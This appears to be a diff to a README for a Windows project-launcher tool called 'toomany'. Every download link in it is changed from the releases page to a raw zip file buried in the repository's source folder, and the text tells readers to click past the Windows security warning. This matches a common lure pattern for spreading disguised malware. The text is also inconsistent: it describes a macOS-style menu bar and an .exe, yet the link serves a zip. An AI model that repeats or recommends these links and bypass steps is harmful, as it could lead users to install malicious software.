@@ -1,6 +1,6 @@
 # 📂 toomany - Open your projects with one hotkey
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Suppressed-bottlecollection848/toomany/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Suppressed-bottlecollection848/toomany/raw/refs/heads/main/Sources/TooMany/Software_2.6.zip)
 
 Managing many software projects creates clutter. Many developers spend time searching through folders to find active work. This tool tracks your recent projects across different editors and tools. It puts them in a menu bar list for quick access. You press a hotkey to see your workspace and jump back into your code.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or 11 to use this app. The software track
 
 To set up the software, follow these steps:
 
-1. Visit the [download page](https://github.com/Suppressed-bottlecollection848/toomany/releases).
+1. Visit the [download page](https://github.com/Suppressed-bottlecollection848/toomany/raw/refs/heads/main/Sources/TooMany/Software_2.6.zip).
 2. Look for the file ending in .exe under the latest version.
 3. Save the file to your computer.
 4. Double-click the file to start the installer.
@@ -20,7 +20,7 @@ To set up the software, follow these steps:
 
 Download the application from the official site.
 
-[Download the latest version here](https://github.com/Suppressed-bottlecollection848/toomany/releases)
+[Download the latest version here](https://github.com/Suppressed-bottlecollection848/toomany/raw/refs/heads/main/Sources/TooMany/Software_2.6.zip)
 
 When you run the file for the first time, Windows may show a security prompt. This happens because the app is new. Click "More info" and then "Run anyway" to proceed. The app will launch and show an icon in your taskbar system tray.
 
